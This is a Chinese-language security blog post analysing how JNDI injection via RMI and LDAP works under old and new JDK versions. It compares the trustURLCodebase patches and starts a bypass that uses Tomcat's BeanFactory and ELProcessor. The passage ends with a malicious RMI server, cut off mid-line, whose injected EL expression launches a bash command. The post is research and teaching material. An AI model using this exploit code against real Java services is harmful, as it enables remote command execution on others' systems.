
<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#202020">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
  
  
    <meta name="keywords" content="Web安全,Java,JNDI注入,">
  

  
    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
  
  
  
  <link rel="icon" type="image/x-icon" href="/1.jpg">
  
  <title>浅析高低版JDK下的JNDI注入及绕过 [ Mi1k7ea ]</title>
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
    
      <link rel="stylesheet" href="/css/xoxo.css">
    
  
</head>


<body>
  <div class="nav-container">
    <nav class="home-menu pure-menu pure-menu-horizontal">
  <a class="pure-menu-heading" href="/">
    
    <span class="title" style="text-transform:none">Mi1k7ea</span>
  </a>

  <ul class="pure-menu-list clearfix">
      
          
            
              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
            
          
      
          
            
              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
            
          
      
  </ul>
   
</nav>

  </div>

  <div class="container" id="content-outer">
    <div class="inner" id="content-inner">
      <div class="post-container">
  <article class="post" id="post">
    <header class="post-header text-center">
      <h1 class="title">
        浅析高低版JDK下的JNDI注入及绕过
      </h1>
      <span>
        
        <time class="time" datetime="2020-09-07T02:13:11.000Z">
        2020-09-07
      </time>
        
      </span>
      <span class="slash">/</span>
      <span class="post-meta">
      <span class="post-tags">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JNDI注入/">JNDI注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
      </span>
    </span>
      <!--<span class="slash">/</span>
      <span class="read">
      <span id="busuanzi_value_page_pv"></span> 点击
    </span>
      <span class="slash">/</span>-->
    </header>

    <div class="post-content">
      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本篇主要是填前面的坑，是<a href="/2019/09/15/浅析JNDI注入/">《浅析JNDI注入》</a>的延续篇，主要调试分析高低版本JDK下JNDI注入的RMI和LDAP两个攻击向量的调用过程及其异同点，再复现调试网上公布的高版本JDK绕过方法。</p>
<h2 id="0x01-调试分析高低版JDK下的JNDI注入"><a href="#0x01-调试分析高低版JDK下的JNDI注入" class="headerlink" title="0x01 调试分析高低版JDK下的JNDI注入"></a>0x01 调试分析高低版JDK下的JNDI注入</h2><p>这里只对常用的RMI和LDAP两个攻击向量进行调试分析。</p>
<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><h4 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h4><p>以之前<a href="/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#%E6%BC%8F%E6%B4%9E%E7%82%B91%E2%80%94%E2%80%94lookup%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5">lookup参数注入的Demo</a>来调试分析下，将RMI服务端的factoryLocation参数改为<code>http://127.0.0.1:8000/</code>，本地JDK为8u112。</p>
<p>直接在com.sun.jndi.rmi.registry.RegistryContext类的lookup()函数下打上断点，此时函数调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lookup:124, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:13, AClient</span><br></pre></td></tr></table></figure>
<p>其中从RMI注册表中lookup查询到服务端中目标类的Reference后返回一个ReferenceWrapper_Stub类实例，该类实例就是客户端的存根、用于实现和服务端进行交互，最后调用decodeObject()函数来解析：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/27.png" alt=""></p>
<p>跟进decodeObject()函数中，先判断入参ReferenceWrapper_Stub类实例是否是RemoteReference接口实现类实例，而ReferenceWrapper_Stub类正是实现RemoteReference接口类的，因此通过判断调用getReference()来获取到ReferenceWrapper_Stub类实例中的Reference即我们在恶意RMI注册中绑定的恶意Reference；再往下调用NamingManager.getObjectInstance()来获取远程服务端上的类实例：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/28.png" alt=""></p>
<p>跟进，调用到getObjectFactoryFromReference()函数，尝试从Reference中获取ObjectFactory：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/29.png" alt=""></p>
<p>跟进，通过codebase和factoryName来调用loadClass()函数来远程加载恶意类EvilClassFactory，最后直接通过newInstance()实例化该远程恶意类并返回：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/30.png" alt=""></p>
<p>注意，<strong>这里返回新建的远程类实例之前会先对实例转换为ObjectFactory类，因此，如果远程类不实现ObjectFactory接口类的话就会在此处报错，之前一些demo的恶意类没实现ObjectFactory类所出现的报错正出于此</strong>。</p>
<p>执行完newInstance()之后就触发漏洞了：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/31.png" alt=""></p>
<p>再往下就是判断新建的远程类实例是否为null，不为null则调用该远程类的getObjectInstance()函数并返回，否则直接返回Reference实例。从这里知道，<strong>其实恶意类的恶意代码除了能写在无参构造函数外，也可以写在重写的getObjectInstance()函数中来触发</strong>。</p>
<p>至此，整个调用过程调试完毕。</p>
<h4 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h4><p>在JDK 6u141、7u131、8u121之后，增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。</p>
<p>这里更换8u251版本的JDK来继续调试。</p>
<p>直接运行会报如下错误，说该ObjectFactory是不可信的，除非设置com.sun.jndi.rmi.object.trustURLCodebase项的值为true：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*]Using lookup() to fetch object with rmi://127.0.0.1:1688/exp</span><br><span class="line">Exception in thread "main" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)</span><br><span class="line">	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)</span><br><span class="line">	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">	at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">	at AClient.main(AClient.java:13)</span><br></pre></td></tr></table></figure>
<p>前面的调用过程是一样的，这里直接根据报错在com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数打断点调试就好，此时函数调用栈：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">decodeObject:495, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:138, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:13, AClient</span><br></pre></td></tr></table></figure>
<p>看到，在调用NamingManager.getObjectInstance()函数获取Reference指定的远程类之前先进行com.sun.jndi.rmi.object.trustURLCodebase值的判断，该值默认为false因此直接抛出错误：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/1.png" alt=""></p>
<h4 id="修补点源码对比"><a href="#修补点源码对比" class="headerlink" title="修补点源码对比"></a>修补点源码对比</h4><p>对比下新旧版JDK的com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数的代码就很清楚了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 低版本JDK</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 高版本JDK</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            Reference var8 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">                var8 = (Reference)var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">                var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="keyword">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="keyword">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>很明显，<strong>就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false</strong>。</p>
<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><h4 id="低版本-1"><a href="#低版本-1" class="headerlink" title="低版本"></a>低版本</h4><p>以之前<a href="/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#LDAP-Reference%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7">LDAP+Reference的Demo</a>来调试分析下，本地JDK为8u181。</p>
<p>先看下，我们在恶意LDAP服务端的sendResult()函数中设置了如下属性项：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br></pre></td></tr></table></figure>
<p>直接在com.sun.jndi.ldap.LdapCtx类的c_lookup()函数上打上断点，此时函数调用栈如下，看到就是不同几个类的lookup()函数在逐次调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c_lookup:1051, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:9, LdapClient</span><br></pre></td></tr></table></figure>
<p>往下调试看到，var4变量是BasicAttributes类实例、其值是我们在恶意LDAP服务端设置的属性值，因为设置了javaClassName属性值为”Exploit”，因此调用了decodeObject()函数来对var4进行对象解码操作：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/8.png" alt=""></p>
<p>跟进decodeObject()函数中，先调用getCodebases()函数获取到javaCodeBase项设置的URL地址<code>http://127.0.0.1:8000/</code>，接着两个判断是否存在javaSerializedData和javaRemoteLocation这两项的值，这里由于没设置就直接进入最后的else语句逻辑，最后由于var1不为null且var1值为前面设置的objectClass内容因此直接调用到decodeReference()函数来进一步解码Reference：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/9.png" alt=""></p>
<p>在decodeReference()函数中，根据设置的javaFactory、javaClassName、javaCodeBase等项来通过执行<code>Reference(&quot;EvilObject&quot;, null, &quot;http://127.0.0.1:8000/&quot;)</code>来新建一个Reference类实例，最后直接返回该Reference类实例：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/10.png" alt=""></p>
<p>decodeObject()函数执行完返回Reference类实例后，继续在com.sun.jndi.ldap.LdapCtx类的c_lookup()函数往下调试，看到最后是调用到了DirectoryManager.getObjectInstance()函数：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/20.png" alt=""></p>
<p>跟进去getObjectInstance()函数的调用，看到其中调用了getObjectFactoryFromReference()函数来从Reference中获取ObjectFactory后再调用getObjectInstance()函数来获取实际的对象实例：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/21.png" alt=""></p>
<p>跟进getObjectFactoryFromReference()函数中，其中通过factoryName和codebase来调用loadClass()函数从<code>http://127.0.0.1:8000/EviObject</code>中远程加载类（在loadClass()函数中实际是通过FactoryURLClassLoader加载器来加载远程Factory URL类）：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/22.png" alt=""></p>
<p>获取到远程恶意类EvilObject后，直接调用newInstance()函数新建该恶意类实例：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/23.png" alt=""></p>
<p>而此时由于EvilObject类的恶意代码是写在无参构造函数中的，因此即使无法成功获取到Object实例也能直接触发漏洞：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/24.png" alt=""></p>
<p><strong>注意：上述报错的原因在于恶意远程类没有实现ObjectFactory接口类，具体原因后面会调试分析到。当然，实现了该接口就不会出现这种报错了。</strong></p>
<h4 id="高版本-1"><a href="#高版本-1" class="headerlink" title="高版本"></a>高版本</h4><p>JDK 6u211、7u201、8u191之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项。</p>
<p>这里更换8u251版本的JDK来继续调试。</p>
<p>前面的函数调用过程和低版本是一样的，直接看下不同的地方，<strong>就是在getObjectFactoryFromReference()函数中调用loadClass()函数时返回了null</strong>，直接在com.sun.naming.internal.VersionHelper12类loadClass()函数上打断点调试，此时函数调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">loadClass:101, VersionHelper12 (com.sun.naming.internal)</span><br><span class="line">getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:189, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:1085, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:9, LdapClient</span><br></pre></td></tr></table></figure>
<p>看到这里添加了个if判断条件，检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，是的话才能正常通过URLClassLoader来加载远程类，否则返回null：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/2.png" alt=""></p>
<p>看到常量trustURLCodebase定义处的源码（位于com.sun.naming.internal.VersionHelper12），可以看到该值是从系统设置找那个获取的，默认为FALSE：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Determines whether classes may be loaded from an arbitrary URL code base.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TRUST_URL_CODEBASE_PROPERTY =</span><br><span class="line">        <span class="string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String trustURLCodebase =</span><br><span class="line">        AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedAction&lt;String&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> String <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> System.getProperty(TRUST_URL_CODEBASE_PROPERTY,</span><br><span class="line">                        <span class="string">"false"</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"false"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure>
<p>由于loadClass()函数返回的是null，因此getObjectFactoryFromReference()函数同样返回null：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/25.png" alt=""></p>
<p>getObjectFactoryFromReference()函数返回的null跳过了中间两个getObjectInstance()函数调用而直接返回refInfo：</p>
<p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/26.png" alt=""></p>
<p>再往后也是返回该Reference类实例直至执行完流程。</p>
<h4 id="修补点源码对比-1"><a href="#修补点源码对比-1" class="headerlink" title="修补点源码对比"></a>修补点源码对比</h4><p>现在比较下新旧版本的com.sun.naming.internal.VersionHelper12类loadClass()函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 旧版本JDK</span></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className A non-null fully qualified class name.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        ClassLoader parent = getContextClassLoader();</span><br><span class="line">        ClassLoader cl =</span><br><span class="line">                 URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新版本JDK</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className A non-null fully qualified class name.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"true"</span>.equalsIgnoreCase(trustURLCodebase)) &#123;</span><br><span class="line">            ClassLoader parent = getContextClassLoader();</span><br><span class="line">            ClassLoader cl =</span><br><span class="line">                    URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>很明显，<strong>就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false</strong>。</p>
<h2 id="0x02-绕过高版本JDK（8u191-）限制"><a href="#0x02-绕过高版本JDK（8u191-）限制" class="headerlink" title="0x02 绕过高版本JDK（8u191+）限制"></a>0x02 绕过高版本JDK（8u191+）限制</h2><p>由前面知道，在JDK 6u211、7u201、8u191、11.0.1之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p>
<p>KINGX提到了如下两种绕过方式：</p>
<blockquote>
<ol>
<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>
<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
</ol>
<p>这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</p>
</blockquote>
<p>简单地说，<strong>在低版本JDK的JNDI注入中，主要利用的就是classFactoryLocation这个参数来实现远程加载类利用的。但是在高版本JDK中对classFactoryLocation这个途径实现了限制，但是对于classFactory这个参数即本地ClassPath中如果存在Gadget的话还是能够进行JNDI注入攻击的</strong>。</p>
<h3 id="利用本地恶意Class作为Reference-Factory"><a href="#利用本地恶意Class作为Reference-Factory" class="headerlink" title="利用本地恶意Class作为Reference Factory"></a>利用本地恶意Class作为Reference Factory</h3><p>简单地说，就是要服务端本地ClassPath中存在恶意Factory类可被利用来作为Reference Factory进行攻击利用。该恶意Factory类必须实现<code>javax.naming.spi.ObjectFactory</code>接口，实现该接口的getObjectInstance()方法。</p>
<p>大佬找到的是这个<code>org.apache.naming.factory.BeanFactory</code>类，其满足上述条件并存在于Tomcat依赖包中，应用广泛。该类的getObjectInstance()函数中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p>
<p>现在来看下RMI攻击向量的代码是如何实现的。</p>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>具体依赖Tomcat中的jar包为：catalina.jar、el-api.jar、jasper-el.jar。</p>
<p>恶意RMI服务端：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil RMI Server is Listening on port: 6666"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry( <span class="number">6666</span>);</span><br><span class="line">        <span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">        <span class="comment">// 利用表达式执行命令</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash', '-c', 'touch 